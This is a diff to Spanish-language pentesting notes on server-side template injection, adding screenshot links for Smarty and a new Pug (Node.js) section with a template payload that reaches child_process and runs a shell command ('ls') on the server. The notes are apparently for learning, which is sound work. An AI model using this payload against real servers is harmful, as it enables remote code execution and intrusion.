@@ -53,8 +53,27 @@ Smarty es una herramienta muy importante, es otro motor de plantilla en php
 
 ## Explotación
 
+![image](https://github.com/user-attachments/assets/e8450429-0531-4f64-bb0a-b132927f0d75)
+
+![image](https://github.com/user-attachments/assets/df691488-5846-42e0-af80-c16285f133f9)
 
 Confirmado que funciona..
 
 # NodeJS - Pug
+
+Pug (anteriormente conocido como Jade) Es un motor de plantilla que usa Node.js renderizando HTML como condicionales, iteraciones y plantillas. Mientras Pug da bastantes buenas herramientas a los desarrolladores, esta disponible para ejectuar código JS directamente sin la necesidad de la plantilla.
+
+Las vulnerabilidades normalmente entran poir lo anterior
+
+## Explotacion
+
+![image](https://github.com/user-attachments/assets/848b8ae1-62a4-4931-928d-639d263c64e4)
+
+```
+#{root.process.mainModule.require('child_process').spawnSync('ls').stdout}
+```
+
+![image](https://github.com/user-attachments/assets/79407ef5-a49d-4a53-8b63-88d22c56a7c8)
+
+
 
